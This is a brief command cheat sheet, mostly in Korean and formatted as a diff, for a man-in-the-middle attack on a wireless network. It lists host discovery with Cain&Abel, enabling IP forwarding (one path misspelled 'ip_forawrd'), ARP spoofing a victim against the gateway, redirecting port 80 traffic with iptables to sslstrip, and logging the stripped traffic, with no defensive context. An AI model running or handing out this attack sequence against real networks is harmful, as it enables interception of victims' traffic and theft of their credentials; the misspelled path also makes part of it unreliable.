@@ -1,0 +1,18 @@
+Cain&Abel tool로 AP+AP에 접속된 host IP를 알아낸다.
+
+fragrouter -B1
+또는
+echo 1 > /proc/sys/net/ipv4/ip_forawrd
+
+arpspoof -i [wlan1] -t [victim ip] [gateway ip]
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
+
+sslstrip -l 10000 -w [file name]
+
+tail -f sslstrip.log
+
+
+PREROUTING rule 미사용하려면 -A 대신에 -D
+iptables -t nat -F  (to flush)
+iptables -t nat -L (to check)
